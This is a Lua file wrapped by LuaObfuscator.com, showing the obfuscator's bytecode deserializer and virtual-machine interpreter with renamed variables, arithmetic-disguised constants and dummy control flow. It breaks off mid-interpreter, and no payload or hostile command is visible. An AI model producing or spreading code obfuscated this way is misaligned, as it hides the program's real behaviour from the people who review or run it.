--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.9) ~  Much Love, Ferib 

]]
--

local v0 = tonumber
local v1 = string.byte
local v2 = string.char
local v3 = string.sub
local v4 = string.gsub
local v5 = string.rep
local v6 = table.concat
local v7 = table.insert
local v8 = math.ldexp
local v9 = getfenv or function()
	return _ENV
end
local v10 = setmetatable
local v11 = pcall
local v12 = select
local v13 = unpack or table.unpack
local v14 = tonumber
local function v15(v16, v17, ...)
	local v18 = 1
	local v19
	v16 = v4(v3(v16, 5), "..", function(v30)
		if v1(v30, 2) == 81 then
			v19 = v0(v3(v30, 1, 1))
			return ""
		else
			local v82 = v2(v0(v30, 16))
			if v19 then
				local v92 = v5(v82, v19)
				v19 = nil
				return v92
			else
				return v82
			end
		end
	end)
	local function v20(v31, v32, v33)
		if v33 then
			local v83 = (v31 / ((5 - (1 + 2)) ^ (v32 - 1)))
				% ((5 - (1 + 2)) ^ (((v33 - (1 - (877 - (282 + 595)))) - (v32 - 1)) + (2 - 1)))
			return v83 - (v83 % ((2257 - (1523 + 114)) - (555 + 64)))
		else
			local v84 = 2 ^ (v32 - (932 - (857 + 74)))
			return (((v31 % (v84 + v84)) >= v84) and (569 - (367 + 201))) or (927 - (214 + 713))
		end
	end
	local function v21()
		local v34 = (0 - 0) + 0
		local v35
		while true do
			if v34 == (1 - 0) then
				return v35
			end
			if v34 == (1065 - (68 + 997)) then
				v35 = v1(v16, v18, v18)
				v18 = v18 + 1
				v34 = 1271 - (226 + 1044)
			end
		end
	end
	local function v22()
		local v36 = 117 - (32 + 85)
		local v37
		local v38
		while true do
			if v36 == (1 + (350 - (87 + 263))) then
				return (v38 * ((237 - (67 + 113)) + 199)) + v37
			end
			if v36 == (957 - (892 + 65)) then
				v37, v38 = v1(v16, v18, v18 + (4 - (2 + 0)))
				v18 = v18 + (3 - 1)
				v36 = 1 - 0
			end
		end
	end
	local function v23()
		local v39, v40, v41, v42 = v1(v16, v18, v18 + 3)
		v18 = v18 + (9 - 5)
		return (v42 * (12338840 + 4438376)) + (v41 * (260471 - 194935)) + (v40 * 256) + v39
	end
	local function v24()
		local v43 = v23()
		local v44 = v23()
		local v45 = 953 - (802 + 150)
		local v46 = (v20(v44, 3 - 2, 53 - 33) * ((3 - 1) ^ (24 + 8))) + v43
		local v47 = v20(v44, 36 - 15, 1028 - (915 + 82))
		local v48 = ((v20(v44, 90 - 58) == (1 + 0)) and -(431 - (3 + 41 + 386))) or (1 - 0)
		if v47 == (1187 - (1069 + 118)) then
			if v46 == (0 - (0 + 0)) then
				return v48 * ((885 - (261 + 624)) - 0)
			else
				local v93 = 1138 - (116 + 1022)
				while true do
					if v93 == (0 + (0 - 0)) then
						v47 = 1
						v45 = 0 - 0
						break
					end
				end
			end
		elseif v47 == (2031 + 16) then
			return ((v46 == (791 - (368 + 423))) and (v48 * (1 / (0 - 0)))) or (v48 * NaN)
		end
		return v8(v48, v47 - 1023) * (v45 + (v46 / (((1941 - (1020 + 60)) - (814 + 45)) ^ (70 - (10 + 8)))))
	end
	local function v25(v49)
		local v50
		if not v49 then
			v49 = v23()
			if v49 == (1423 - (630 + 793)) then
				return ""
			end
		end
		v50 = v3(v16, v18, (v18 + v49) - (3 - 2))
		v18 = v18 + v49
		local v51 = {}
		for v66 = 4 - 3, #v50 do
			v51[v66] = v2(v1(v3(v50, v66, v66)))
		end
		return v6(v51)
	end
	local v26 = v23
	local function v27(...)
		return { ... }, v12("#", ...)
	end
	local function v28()
		local v52 = (function()
			return 1145 - (466 + 679)
		end)()
		local v53 = (function()
			return
		end)()
		local v54 = (function()
			return
		end)()
		local v55 = (function()
			return
		end)()
		local v56 = (function()
			return
		end)()
		local v57 = (function()
			return
		end)()
		local v58 = (function()
			return
		end)()
		local v59 = (function()
			return
		end)()
		while true do
			if v52 == (1 + 0) then
				local v88 = (function()
					return 0 + 0
				end)()
				local v89 = (function()
					return
				end)()
				while true do
					if v88 == (0 - 0) then
						v89 = (function()
							return 0 - 0
						end)()
						while true do
							if v89 == 0 then
								v56 = (function()
									return {}
								end)()
								v57 = (function()
									return { v54, v55, nil, v56 }
								end)()
								v89 = (function()
									return 1 + 0
								end)()
							end
							if v89 ~= 1 then
							else
								v58 = (function()
									return v23()
								end)()
								v52 = (function()
									return 2
								end)()
								break
							end
						end
						break
					end
				end
			end
			if v52 == (1636 - (1373 + 263)) then
				local v90 = (function()
					return 1000 - (451 + 549)
				end)()
				while true do
					if v90 == (1 + 0) then
						v55 = (function()
							return {}
						end)()
						v52 = (function()
							return 1 + 0
						end)()
						break
					end
					if v90 ~= (0 - 0) then
					else
						v53 = (function()
							return function(v112, v113, v114)
								local v115 = (function()
									return 0 - 0
								end)()
								local v116 = (function()
									return
								end)()
								while true do
									if v115 ~= 0 then
									else
										v116 = (function()
											return 1384 - (746 + 638)
										end)()
										while true do
											if v116 ~= (0 + 0) then
											else
												local v127 = (function()
													return 0 - 0
												end)()
												local v128 = (function()
													return
												end)()
												while true do
													if v127 == (0 - 0) then
														v128 = (function()
															return 0 - 0
														end)()
														while true do
															if v128 == (341 - (218 + 123)) then
																v112[v113 - #","] = (function()
																	return v114()
																end)()
																return v112, v113, v114
															end
														end
														break
													end
												end
											end
										end
										break
									end
								end
							end
						end)()
						v54 = (function()
							return {}
						end)()
						v90 = (function()
							return 585 - (57 + 527)
						end)()
					end
				end
			end
			if v52 == 2 then
				v59 = (function()
					return {}
				end)()
				for v94 = #",", v58 do
					local v95 = (function()
						return 0
					end)()
					local v96 = (function()
						return
					end)()
					local v97 = (function()
						return
					end)()
					local v98 = (function()
						return
					end)()
					while true do
						if v95 ~= (1581 - (1535 + 46)) then
						else
							local v111 = (function()
								return 0 + 0
							end)()
							while true do
								if 0 ~= v111 then
								else
									v96 = (function()
										return 0 + 0
									end)()
									v97 = (function()
										return nil
									end)()
									v111 = (function()
										return 1 + 0
									end)()
								end
								if (1 - 0) == v111 then
									v95 = (function()
										return 561 - (306 + 254)
									end)()
									break
								end
							end
						end
						if v95 ~= (167 - (122 + 44)) then
						else
							v98 = (function()
								return nil
							end)()
							while true do
								if v96 ~= 1 then
								else
									if v97 == #">" then
										v98 = (function()
											return v21() ~= 0
										end)()
									elseif v97 == (2 - 0) then
										v98 = (function()
											return v24()
										end)()
									elseif v97 == #"nil" then
										v98 = (function()
											return v25()
										end)()
									end
									v59[v94] = (function()
										return v98
									end)()
									break
								end
								if v96 ~= (0 + 0) then
								else
									local v120 = (function()
										return 0
									end)()
									local v121 = (function()
										return
									end)()
									while true do
										if v120 ~= 0 then
										else
											v121 = (function()
												return 0 - 0
											end)()
											while true do
												if v121 == (1 + 0) then
													v96 = (function()
														return 1 - 0
													end)()
													break
												end
												if (0 + 0) ~= v121 then
												else
													v97 = (function()
														return v21()
													end)()
													v98 = (function()
														return nil
													end)()
													v121 = (function()
														return 1468 - (899 + 568)
													end)()
												end
											end
											break
										end
									end
								end
							end
							break
						end
					end
				end
				v57[#"19("] = (function()
					return v21()
				end)()
				v52 = (function()
					return 3
				end)()
			end
			if (2 + 1) == v52 then
				for v99 = #",", v23() do
					local v100 = (function()
						return v21()
					end)()
					if v20(v100, #"!", #"|") ~= (0 - 0) then
					else
						local v106 = (function()
							return 65 - (30 + 35)
						end)()
						local v107 = (function()
							return
						end)()
						local v108 = (function()
							return
						end)()
						local v109 = (function()
							return
						end)()
						local v110 = (function()
							return
						end)()
						while true do
							if v106 == (1 + 0) then
								local v117 = (function()
									return 603 - (268 + 335)
								end)()
								while true do
									if v117 == 0 then
										v109 = (function()
											return nil
										end)()
										v110 = (function()
											return nil
										end)()
										v117 = (function()
											return 291 - (60 + 230)
										end)()
									end
									if v117 ~= (573 - (426 + 146)) then
									else
										v106 = (function()
											return 1 + 1
										end)()
										break
									end
								end
							end
							if v106 ~= (7 - 5) then
							else
								while true do
									if v107 == #"|" then
										local v122 = (function()
											return 1456 - (282 + 1174)
										end)()
										local v123 = (function()
											return
										end)()
										while true do
											if v122 == (811 - (569 + 242)) then
												v123 = (function()
													return 0 - 0
												end)()
												while true do
													if v123 == 1 then
														v107 = (function()
															return 582 - (361 + 219)
														end)()
														break
													end
													if v123 == (0 - 0) then
														v110 = (function()
															return { v22(), v22(), nil, nil }
														end)()
														if v108 == (1024 - (706 + 318)) then
															local v361 = (function()
																return 1251 - (721 + 530)
															end)()
															local v362 = (function()
																return
															end)()
															while true do
																if v361 == (0 + 0) then
																	v362 = (function()
																		return 1271 - (945 + 326)
																	end)()
																	while true do
																		if v362 == (0 - 0) then
																			v110[#"xxx"] = (function()
																				return v22()
																			end)()
																			v110[#"asd1"] = (function()
																				return v22()
																			end)()
																			break
																		end
																	end
																	break
																end
															end
														elseif v108 == #"|" then
															v110[#"91("] = (function()
																return v23()
															end)()
														elseif v108 == 2 then
															v110[#"xnx"] = (function()
																return v23() - (2 ^ (15 + 1))
															end)()
														elseif v108 == #"xxx" then
															local v380 = (function()
																return 700 - (271 + 429)
															end)()
															local v381 = (function()
																return
															end)()
															while true do
																if v380 == (0 + 0) then
																	v381 = (function()
																		return 0 - 0
																	end)()
																	while true do
																		if v381 == (1500 - (1408 + 92)) then
																			v110[#"91("] = (function()
																				return v23()
																					- ((2 + 0) ^ (866 - (20 + 830)))
																			end)()
																			v110[#"0313"] = (function()
																				return v22()
																			end)()
																			break
																		end
																	end
																	break
																end
															end
														end
														v123 = (function()
															return 1087 - (461 + 625)
														end)()
													end
												end
												break
											end
										end
									end
									if v107 == (128 - (116 + 10)) then
										local v124 = (function()
											return 0 + 0
										end)()
										while true do
											if v124 == (1289 - (993 + 295)) then
												v107 = (function()
													return #"nil"
												end)()
												break
											end
											if v124 == (0 + 0) then
												if v20(v109, #"/", #"[") == #"<" then
													v110[1173 - (418 + 753)] = (function()
														return v59[v110[2]]
													end)()
												end
												if v20(v109, 2 + 0, 2) ~= #"|" then
												else
													v110[#"xxx"] = (function()
														return v59[v110[#"gha"]]
													end)()
												end
												v124 = (function()
													return 1
												end)()
											end
										end
									end
									if v107 == (0 + 0) then
										local v125 = (function()
											return 0 + 0
										end)()
										while true do
											if v125 == (0 + 0) then
												v108 = (function()
													return v20(v100, 1 + 1, #"xnx")
												end)()
												v109 = (function()
													return v20(v100, #"http", 15 - 9)
												end)()
												v125 = (function()
													return 1
												end)()
											end
											if v125 == (530 - (406 + 123)) then
												v107 = (function()
													return #"]"
												end)()
												break
											end
										end
									end
									if v107 == #"91(" then
										if v20(v109, #"19(", #"19(") ~= #"," then
										else
											v110[#"http"] = (function()
												return v59[v110[#"0313"]]
											end)()
										end
										v54[v99] = (function()
											return v110
										end)()
										break
									end
								end
								break
							end
							if v106 == 0 then
								local v118 = (function()
									return 1769 - (1749 + 20)
								end)()
								while true do
									if 0 ~= v118 then
									else
										v107 = (function()
											return 0 + 0
										end)()
										v108 = (function()
											return nil
										end)()
										v118 = (function()
											return 1
										end)()
									end
									if v118 ~= (1323 - (1249 + 73)) then
									else
										v106 = (function()
											return 1 + 0
										end)()
										break
									end
								end
							end
						end
					end
				end
				for v101 = #">", v23() do
					v55, v101, v28 = (function()
						return v53(v55, v101, v28)
					end)()
				end
				return v57
			end
		end
	end
	local function v29(v60, v61, v62)
		local v63 = v60[1 + 0]
		local v64 = v60[1123 - ((2023 - (830 + 1075)) + (2976 - 1973))]
		local v65 = v60[8 - 5]
		return function(...)
			local v68 = v63
			local v69 = v64
			local v70 = v65
			local v71 = v27
			local v72 = 1
			local v73 = -(378 - (78 + 64 + 235))
			local v74 = {}
			local v75 = { ... }
			local v76 = v12("#", ...) - (4 - 3)
			local v77 = {}
			local v78 = {}
			for v85 = 0 + 0, v76 do
				if v85 >= v70 then
					v74[v85 - v70] = v75[v85 + (978 - (553 + 424))]
				else
					v78[v85] = v75[v85 + 1]
				end
			end
			local v79 = (v76 - v70) + ((1 - 0) - 0)
			local v80
			local v81
			while true do
				v80 = v68[v72]
				v81 = v80[1 + 0]
				if (4854 > 4464) and (v81 <= (37 + 0)) then
					if v81 <= (11 + 5 + 2) then
						if v81 <= ((528 - (303 + 221)) + 4) then
							if v81 <= ((1271 - (231 + 1038)) + 1) then
								if (v81 <= (2 - 1)) or (4912 == 3758) then
									if v81 == (0 - 0) then
										local v130 = v80[2]
										do
											return v78[v130](v13(v78, v130 + (2 - 1), v73))
										end
									else
										for v214 = v80[1 + 1], v80[14 - 11] do
											v78[v214] = nil
										end
									end
								elseif (126 <= 3482) and (v81 == (755 - (239 + 514))) then
									local v131 = v80[1 + 1 + 0]
									local v132 = v78[v80[(741 + 591) - (797 + (1694 - (171 + 991)))]]
									v78[v131 + (4 - 3) + 0] = v132
									v78[v131] = v132[v80[2 + 2]]
								else
									v78[v80[2 + 0]] = v78[v80[6 - 3]]
								end
							elseif (v81 <= (13 - 8)) or (2374 == 4374) then
								if (1575 == 1575) and (v81 == (1206 - (373 + 697 + 132))) then
									local v138 = 0
									local v139
									local v140
									while true do
										if
											(v138 == ((716 + 15) - ((909 - (153 + 280)) + (736 - 481)))) or (
												2234 == 1455
											)
										then
											v139 = v80[1132 - (369 + 761)]
											v140 = v78[v139]
											v138 = 1 + 0 + 0
										end
										if v138 == (1 - (0 - 0)) then
											for v332 = v139 + 1, v80[(5 + 0) - (1 + 1)] do
												v7(v140, v78[v332])
											end
											break
										end
									end
								else
									do
										return v78[v80[240 - ((224 - 160) + 174)]]()
									end
								end
							elseif (v81 <= 6) or (1067 > 1779) then
								local v141 = v69[v80[1 + 2]]
								local v142
								local v143 = {}
								v142 = v10({}, {
									__index = function(v216, v217)
										local v218 = v143[v217]
										return v218[1 - 0][v218[338 - (144 + 192)]]
									end,
									__newindex = function(v219, v220, v221)
										local v222 = 0
										local v223
										while true do
											if v222 == (216 - (42 + 174)) then
												v223 = v143[v220]
												v223[1 + 0][v223[2 + 0]] = v221
												break
											end
										end
									end,
								})
								for v224 = 1 + 0 + 0, v80[(2296 - 788) - (225 + 138 + 1141)] do
									v72 = v72 + (1581 - (1183 + 397))
									local v225 = v68[v72]
									if (2161 >= 934) and (v225[2 - 1] == (3 + (0 - 0))) then
										v143[v224 - (1 + 0)] = { v78, v225[1978 - (1913 + 62)] }
									else
										v143[v224 - ((159 - (91 + 67)) + 0)] = { v61, v225[1936 - (565 + 1368)] }
									end
									v77[#v77 + (3 - (5 - 3))] = v143
								end
								v78[v80[1663 - (1477 + (1233 - (572 + 477)))]] = v29(v141, v142, v62)
							elseif v81 > (9 - 2) then
								v78[v80[2 + 0]] = v62[v80[859 - (564 + 292)]]
							else
								v78[v80[2 - 0]] = #v78[v80[(2 + 6) - 5]]
							end
						elseif v81 <= 13 then
							if (1612 == 1612) and (v81 <= (314 - (244 + 60))) then
								if v81 > (7 + 2) then
									if (4352 >= 2833) and (v80[2] == v78[v80[3 + 1]]) then
										v72 = v72 + (477 - (41 + 435))
									else
										v72 = v80[(251 + 753) - (112 + 826 + (149 - (84 + 2)))]
									end
								elseif not v78[v80[2 + 0]] then
									v72 = v72 + 1
								else
									v72 = v80[4 - 1]
								end
							elseif (v81 <= 11) or (3222 < 3073) then
								local v145 = v80[1127 - (936 + 137 + 52)]
								local v146 = v80[2 + 2]
								local v147 = v145 + (1615 - (1565 + 48))
								local v148 = { v78[v145](v78[v145 + (843 - (497 + 345))], v78[v147]) }
								for v227 = 1, v146 do
									v78[v147 + v227] = v148[v227]
								end
								local v149 = v148[(30 + 1109) - (782 + 356)]
								if v149 then
									v78[v147] = v149
									v72 = v80[270 - (176 + 91)]
								else
									v72 = v72 + 1
								end
							elseif (744 <= 2942) and (v81 > (30 - 18)) then
								v78[v80[2 - 0]] = v61[v80[1095 - (975 + (640 - (423 + 100)))]]
							else
								local v257 = v80[1 + 1]
								local v258 = v80[(5202 - 3323) - (157 + 1718)]
								local v259 = v257 + 1 + 1 + 0
								local v260 = { v78[v257](v78[v257 + (3 - 2)], v78[v259]) }
								for v315 = (2 + 1) - 2, v258 do
									v78[v259 + v315] = v260[v315]
								end
								local v261 = v260[1019 - ((2030 - (605 + 728)) + 321)]
								if v261 or (1833 <= 1322) then
									local v335 = 0 - 0
									while true do
										if v335 == (0 - 0) then
											v78[v259] = v261
											v72 = v80[(777 - (326 + 445)) - 3]
											break
										end
									end
								else
									v72 = v72 + 1
								end
							end
						elseif v81 <= (6 + 9) then
							if (v81 > (25 - (8 + 3))) or (3467 <= 1055) then
								if v78[v80[5 - (13 - 10)]] == v80[1231 - (322 + 905)] then
									v72 = v72 + (612 - (602 + (19 - 10)))
								else
									v72 = v80[1192 - (449 + 740)]
								end
							elseif v78[v80[874 - (826 + 46)]] then
								v72 = v72 + (948 - (12 + 233 + 702))
							else
								v72 = v80[9 - 6]
							end
						elseif v81 <= (6 + 10) then
							v78[v80[1900 - ((579 - 319) + 1638)]] = v80[443 - ((891 - 509) + 58)] ~= 0
						elseif v81 > (54 - 37) then
							v72 = v80[3 + 0]
						else
							local v265 = v80[3 - 1]
							local v266 = v78[v265]
							local v267 = v80[3]
							for v318 = 2 - 1, v267 do
								v266[v318] = v78[v265 + v318]
							end
						end
					elseif v81 <= 27 then
						if v81 <= 22 then
							if v81 <= (1225 - (902 + 303)) then
								if v81 > (41 - (20 + 2)) then
									if v78[v80[(10 - 6) - (2 + 0)]] == v80[4] then
										v72 = v72 + (490 - (457 + 32)) + 0
									else
										v72 = v80[(2404 - (530 + 181)) - (1121 + 569)]
									end
								else
									local v151 = 214 - (22 + 192)
									local v152
									local v153
									local v154
									while true do
										if v151 == (683 - ((1364 - (614 + 267)) + 200)) then
											v152 = v69[v80[1466 - (1404 + 59)]]
											v153 = nil
											v151 = 2 - 1
										end
										if v151 == 1 then
											v154 = {}
											v153 = v10({}, {
												__index = function(v336, v337)
													local v338 = v154[v337]
													return v338[1][v338[2 - 0]]
												end,
												__newindex = function(v339, v340, v341)
													local v342 = 0
													local v343
													while true do
														if (3541 == 3541) and (v342 == (765 - (468 + 297))) then
															v343 = v154[v340]
															v343[563 - (334 + 228)][v343[6 - 4]] = v341
															break
														end
													end
												end,
											})
											v151 = 4 - (1404 - (832 + 570))
										end
										if v151 == ((2 - 0) - 0) then
											for v344 = (2 - 1) + 0, v80[240 - ((498 - 357) + 95)] do
												v72 = v72 + (2 - 1) + 0
												local v345 = v68[v72]
												if (v345[1] == (7 - 4)) or (3557 >= 4003) then
													v154[v344 - (2 - 1)] = { v78, v345[3] }
												else
													v154[v344 - (2 - 1)] = { v61, v345[3] }
												end
												v77[#v77 + ((1 + 0) - 0)] = v154
											end
											v78[v80[2 + 0]] = v29(v152, v153, v62)
											break
										end
									end
								end
							elseif (v81 == 21) or (657 >= 1668) then
								do
									return
								end
							else
								local v155 = v80[165 - (92 + 71)]
								local v156 = v78[v155]
								local v157 = v80[2 + 1]
								for v230 = 1 - 0, v157 do
									v156[v230] = v78[v155 + v230]
								end
							end
						elseif (v81 <= ((205 + 584) - ((1009 - 435) + 191))) or (1027 > 3858) then
							if v81 == (19 + 4) then
								local v158 = 0 - 0
								local v159
								local v160
								while true do
									if (v158 == (0 + 0)) or (3654 < 450) then
										v159 = v80[852 - (254 + (1391 - (588 + 208)))]
										v160 = v78[v159]
										v158 = (262 - 135) - (55 + (191 - 120))
									end
									if v158 == (1 - 0) then
										for v347 = v159 + (1791 - (573 + 1217)), v80[4] do
											v160 = v160 .. v78[v347]
										end
										v78[v80[5 - 3]] = v160
										break
									end
								end
							else
								v78[v80[(1813 - (1293 + 519)) + 1]] = v61[v80[4 - 1]]
							end
						elseif v81 <= (964 - (714 + 225)) then
							local v163 = v80[5 - 3]
							do
								return v78[v163](v13(v78, v163 + (1 - 0), v73))
							end
						elseif v81 > (3 + 23) then
							local v269 = v80[2 - 0]
							do
								return v78[v269](v13(v78, v269 + ((1645 - 838) - (118 + 688)), v80[3]))
							end
						else
							local v270 = 0
							local v271
							local v272
							while true do
								if v270 == ((127 - 78) - ((47 - 22) + 23)) then
									for v365 = 1 + 0, #v77 do
										local v366 = v77[v365]
										for v371 = 1886 - (927 + (2007 - 1048)), #v366 do
											local v372 = v366[v371]
											local v373 = v372[(2 + 1) - 2]
											local v374 = v372[734 - (16 + 716)]
											if (v373 == v78) and (v374 >= v271) then
												local v376 = 0 - 0
												while true do
													if (1891 < 4453) and (v376 == (97 - (11 + 86))) then
														v272[v374] = v373[v374]
														v372[2 - 1] = v272
														break
													end
												end
											end
										end
									end
									break
								end
								if v270 == (285 - (175 + 110)) then
									v271 = v80[(657 - (232 + 421)) - 2]
									v272 = {}
									v270 = 1890 - (1569 + 320)
								end
							end
						end
					elseif (v81 <= ((676 - 519) - 125)) or (3140 < 2129) then
						if v81 <= ((4299 - 2474) - (503 + 1293)) then
							if v81 == 28 then
								local v164 = 0 - 0
								local v165
								while true do
									if (v164 == 0) or (2555 < 1240) then
										v165 = v80[2]
										v78[v165] = v78[v165](v78[v165 + 1 + 0])
										break
									end
								end
							else
								v78[v80[2]] = v29(v69[v80[1064 - (810 + 251)]], nil, v62)
							end
						elseif v81 <= (21 + 9) then
							local v167 = v80[2 + 0]
							v78[v167] = v78[v167](v78[v167 + 1 + 0 + 0])
						elseif v81 == (28 + 3) then
							v78[v80[535 - (43 + 490)]][v80[736 - (711 + 22)]] = v78[v80[15 - 11]]
						else
							local v275 = 0
							local v276
							while true do
								if (v275 == (859 - (240 + 619))) or (4727 <= 4722) then
									v276 = v80[1 + 1 + 0]
									v78[v276](v78[v276 + (3 - 2)])
									break
								end
							end
						end
					elseif (740 < 4937) and (v81 <= (53 - 19)) then
						if v81 == (3 + 30) then
							local v169 = v80[2]
							local v170, v171 = v71(v78[v169]())
							v73 = (v171 + v169) - (2 - 1)
							local v172 = 0
							for v233 = v169, v73 do
								v172 = v172 + (1745 - (1344 + 400))
								v78[v233] = v170[v172]
							end
						else
							do
								return v78[v80[407 - (255 + 150)]]()
							end
						end
					elseif v81 <= ((633 - (316 + 289)) + 7) then
						local v173 = v80[2 + 0]
						local v174 = {}
						for v236 = 4 - 3, #v77 do
							local v237 = v77[v236]
							for v277 = 0 - 0, #v237 do
								local v278 = v237[v277]
								local v279 = v278[1740 - (404 + 1335)]
								local v280 = v278[408 - (43 + 140 + 223)]
								if (v279 == v78) and (v280 >= v173) then
									v174[v280] = v279[v280]
									v278[1 - 0] = v174
								end
							end
						end
					elseif v81 == 36 then
						local v281 = v80[2 + 0]
						v78[v281] = v78[v281](v13(v78, v281 + 1 + 0, v80[340 - (10 + 327)]))
					else
						v78[v80[2 + 0]] = v80[341 - (118 + 220)]
					end
				elseif v81 <= (7 + 12 + 37) then
					if v81 <= (495 - (108 + (892 - 551))) then
						if (3658 >= 280) and (v81 <= (1 + 18 + 22)) then
							if v81 <= 39 then
								if v81 == (160 - (77 + 45)) then
									local v175 = v80[1495 - (711 + 782)]
									v78[v175](v13(v78, v175 + (1097 - (709 + 387)), v80[5 - 2]))
								else
									local v176 = 469 - (270 + 199)
									local v177
									while true do
										if v176 == 0 then
											v177 = v80[1 + 1]
											do
												return v13(v78, v177, v73)
											end
											break
										end
									end
								end
							elseif (v81 == (1859 - (580 + 1239))) or (885 >= 1031) then
								local v178 = 0 - (1453 - (666 + 787))
								local v179
								while true do
									if (3554 >= 525) and (0 == v178) then
										v179 = v80[2 + 0]
										v78[v179](v13(v78, v179 + (426 - (360 + 65)) + 0, v80[2 + 1]))
										break
									end
								end
							else
								local v180 = (0 + 0) - 0
								local v181
								while true do
									if v180 == (0 + 0) then
										v181 = v80[2]
										do
											return v13(v78, v181, v73)
										end
										break
									end
								end
							end
						elseif v81 <= 43 then
							if v81 == (1209 - (645 + 522)) then
								local v182 = v80[2]
								v78[v182] = v78[v182]()
							else
								v78[v80[2]] = {}
							end
						elseif (2414 <= 2972) and (v81 <= 44) then
							v78[v80[(3650 - (673 + 1185)) - (1010 + 780)]][v80[3 + 0]] = v80[19 - 15]
						elseif v81 > (131 - (340 - (79 + 175))) then
							v72 = v80[3]
						else
							local v286 = v80[1838 - (1045 + 791)]
							local v287 = v78[v80[7 - (5 - 1)]]
							v78[v286 + (1 - 0)] = v287
							v78[v286] = v287[v80[509 - (351 + 154)]]
						end
					elseif v81 <= (1625 - (1281 + 229 + 64)) then
						if (3529 <= 3538) and (v81 <= (314 - ((85 - 57) + 238))) then
							if v81 > (104 - 57) then
								for v238 = v80[1561 - ((4004 - 2623) + 178)], v80[3 + 0] do
									v78[v238] = nil
								end
							elseif v80[2 + 0] == v78[v80[2 + 2]] then
								v72 = v72 + 1
							else
								v72 = v80[10 - (12 - 5)]
							end
						elseif v81 <= (26 + (73 - 50)) then
							v78[v80[472 - (381 + 89)]] = v29(v69[v80[902 - (503 + 396)]], nil, v62)
						elseif (v81 == (45 + 5)) or (2861 < 458) then
							v78[v80[2 + 0]] = #v78[v80[4 - 1]]
						else
							local v293 = v78[v80[1160 - ((1766 - 692) + 82)]]
							if not v293 then
								v72 = v72 + ((182 - (92 + 89)) - 0)
							else
								v78[v80[1786 - (214 + (3045 - 1475))]] = v293
								v72 = v80[1458 - (990 + 465)]
							end
						end
					elseif (1717 <= 4525) and (v81 <= (38 + 15)) then
						if (v81 == (22 + 30)) or (3178 <= 1524) then
							v78[v80[2]] = v80[2 + 1 + 0]
						else
							local v190 = v78[v80[3 + 1]]
							if not v190 then
								v72 = v72 + 1 + 0
							else
								v78[v80[7 - (6 - 1)]] = v190
								v72 = v80[3]
							end
						end
					elseif v81 <= (1780 - (1668 + 58)) then
						do
							return v78[v80[628 - (512 + 114)]]
						end
					elseif v81 > (14 + 41) then
						if (4254 > 370) and v78[v80[5 - 3]] then
							v72 = v72 + ((1 + 0) - 0)
						else
							v72 = v80[(19 - 9) - 7]
						end
					else
						v78[v80[1 + (1 - 0)]] = v78[v80[1 + 2]][v80[4]]
					end
				elseif v81 <= (57 + 8) then
					if v81 <= (202 - 142) then
						if v81 <= 58 then
							if v81 == ((8031 - 5980) - (109 + 1885)) then
								local v191 = v80[(202 + 1269) - (1269 + 200)]
								local v192 = { v78[v191](v78[v191 + (816 - (98 + 717))]) }
								local v193 = 1880 - (446 + 1434)
								for v240 = v191, v80[830 - (802 + 24)] do
									local v241 = 0 - 0
									while true do
										if (0 - 0) == v241 then
											v193 = v193 + 1 + 0
											v78[v240] = v192[v193]
											break
										end
									end
								end
							else
								local v194 = v80[6 - 3]
								local v195 = v78[v194]
								for v242 = v194 + 1, v80[4] do
									v195 = v195 .. v78[v242]
								end
								v78[v80[2 + 0]] = v195
							end
						elseif v81 == (10 + 49) then
							local v197 = v80[1 + (1284 - (1040 + 243))]
							local v198 = { v78[v197](v78[v197 + (2 - 1)]) }
							local v199 = 0 - 0
							for v243 = v197, v80[2 + 2] do
								v199 = v199 + 1 + 0
								v78[v243] = v198[v199]
							end
						elseif not v78[v80[1 + 1]] then
							v72 = v72 + 1 + 0
						else
							v72 = v80[3]
						end
					elseif (v81 <= (46 + 16)) or (1635 == 1777) then
						if v81 > (29 + 32) then
							local v200 = v80[1435 - (797 + (2483 - (559 + 1288)))]
							v78[v200](v78[v200 + (4 - 3)])
						else
							local v201 = (4930 - 3311) - (1427 + 24 + 168)
							local v202
							while true do
								if v201 == (0 + 0) then
									v202 = v80[4 - 2]
									do
										return v13(v78, v202, v202 + v80[3])
									end
									break
								end
							end
						end
					elseif v81 <= (57 + 6) then
						do
							return
						end
					elseif (v81 > (30 + 34)) or (3338 >= 3993) then
						local v299 = v80[328 - (192 + 134)]
						v78[v299] = v78[v299]()
					else
						v78[v80[1278 - (316 + 960)]][v80[(1933 - (609 + 1322)) + (455 - (13 + 441))]] =
							v78[v80[(1248 - (485 + 759)) + (0 - 0)]]
					end
				elseif v81 <= (65 + 5) then
					if v81 <= (256 - 189) then
						if v81 > (617 - (83 + 468)) then
							v78[v80[(4183 - 2375) - (1202 + 604)]] = v80[(33 - 20) - 10] ~= ((1189 - (442 + 747)) - 0)
						else
							v78[v80[(1140 - (832 + 303)) - 3]] = v78[v80[328 - (45 + 280)]]
						end
					elseif (1154 <= 1475) and (v81 <= (66 + 2)) then
						do
							return v78[v80[2]]
						end
					elseif v81 == 69 then
						v78[v80[2 + 0]] = {}
					else
						local v304 = v80[1 + 1]
						v78[v304] = v78[v304](v13(v78, v304 + 1 + 0, v80[(947 - (88 + 858)) + 2]))
					end
				elseif v81 <= (132 - 60) then
					if v81 > (1982 - (340 + 1571)) then
						v78[v80[1 + 1]][v80[1775 - (1733 + 39)]] = v80[10 - 6]
					else
						v78[v80[2]] = v78[v80[1037 - (39 + 86 + 909)]][v80[4]]
					end
				elseif v81 <= (2021 - (1096 + 852)) then
					local v210 = v80[1 + 1]
					local v211, v212 = v71(v78[v210]())
					v73 = (v212 + v210) - (1 - 0)
					local v213 = (0 - 0) + 0
					for v246 = v210, v73 do
						local v247 = (20 + 492) - (409 + 103)
						while true do
							if (v247 == (236 - (46 + 190))) or (2610 < 1230) then
								v213 = v213 + (96 - (51 + 37 + 7))
								v78[v246] = v211[v213]
								break
							end
						end
					end
				elseif (v81 > (21 + (192 - 139))) or (1448 == 3083) then
					local v306 = v80[1319 - (1114 + 203)]
					do
						return v78[v306](v13(v78, v306 + ((30 + 697) - (228 + 498)), v80[1 + 2]))
					end
				else
					v78[v80[2 + 0]] = v62[v80[666 - (174 + 489)]]
